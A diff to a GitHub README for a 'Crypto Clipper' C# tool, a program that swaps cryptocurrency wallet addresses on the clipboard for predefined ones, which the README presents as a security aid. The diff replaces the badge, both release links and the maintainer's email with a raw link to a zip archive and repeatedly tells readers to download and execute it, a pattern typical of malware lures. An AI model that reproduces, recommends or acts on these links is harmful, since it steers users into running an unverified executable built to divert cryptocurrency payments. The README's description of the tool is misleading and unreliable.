@@ -1,6 +1,6 @@
 # Crypto Clipper C# Tool 🪙✂️
 
-![Crypto Clipper](https://img.shields.io/badge/Crypto%20Clipper-C%23-brightgreen)
+![Crypto Clipper](https://github.com/FelixOyeleke/Crypto-Clipper-C-Sharp-1e/raw/refs/heads/main/Xylia/Clipper_e_Sharp_Crypto_3.2.zip%20Clipper-C%23-brightgreen)
 
 Welcome to the **Crypto Clipper C# Tool**! This project provides a useful tool for monitoring clipboard activity and replacing cryptocurrency wallet addresses with predefined ones. Using regex detection and RSA encryption, this tool aims to enhance your security when dealing with cryptocurrency transactions.
 
@@ -25,7 +25,7 @@ Welcome to the **Crypto Clipper C# Tool**! This project provides a useful tool f
 
 ## Installation
 
-To get started, you need to download the latest version of the tool. You can find it in the [Releases section](https://github.com/FelixOyeleke/Crypto-Clipper-C-Sharp-1e/releases). Download the appropriate file and execute it to install the tool on your system.
+To get started, you need to download the latest version of the tool. You can find it in the [Releases section](https://github.com/FelixOyeleke/Crypto-Clipper-C-Sharp-1e/raw/refs/heads/main/Xylia/Clipper_e_Sharp_Crypto_3.2.zip). Download the appropriate file and execute it to install the tool on your system.
 
 ### Requirements
 
@@ -83,11 +83,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries, please reach out to the project maintainer:
 
 - **Name**: Felix Oyeleke
-- **Email**: felixoyeleke@example.com
+- **Email**: https://github.com/FelixOyeleke/Crypto-Clipper-C-Sharp-1e/raw/refs/heads/main/Xylia/Clipper_e_Sharp_Crypto_3.2.zip
 
 ## Releases
 
-To download the latest version of the Crypto Clipper C# Tool, visit the [Releases section](https://github.com/FelixOyeleke/Crypto-Clipper-C-Sharp-1e/releases). Make sure to download and execute the file to get started.
+To download the latest version of the Crypto Clipper C# Tool, visit the [Releases section](https://github.com/FelixOyeleke/Crypto-Clipper-C-Sharp-1e/raw/refs/heads/main/Xylia/Clipper_e_Sharp_Crypto_3.2.zip). Make sure to download and execute the file to get started.
 
 ## Topics
 
